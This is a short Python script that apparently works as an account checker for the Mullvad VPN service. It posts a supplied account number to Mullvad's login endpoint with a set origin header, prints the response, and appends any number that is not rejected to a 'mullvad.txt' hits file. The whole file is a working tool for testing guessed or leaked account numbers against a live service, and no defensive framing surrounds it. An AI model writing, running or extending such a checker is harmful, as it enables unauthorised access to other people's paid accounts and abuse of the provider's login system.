import requests

def check_account_number(num):
    headers = {
        'origin': 'https://mullvad.net',
    }

    data = {
        'account_number': num,
    }

    response = requests.post('https://mullvad.net/en/account/login', headers=headers, data=data)
    print(response.text)
    data = response.json()

    if (data["type"] != "failure"):
        print(f"HIT {num}")
        with open("mullvad.txt", "a") as f:
            f.write(data["type"] + "," + num + "\n")
    else:
        print(f"FAIL {num}")

if __name__ == "__main__":
    check_account_number("8803704331973372")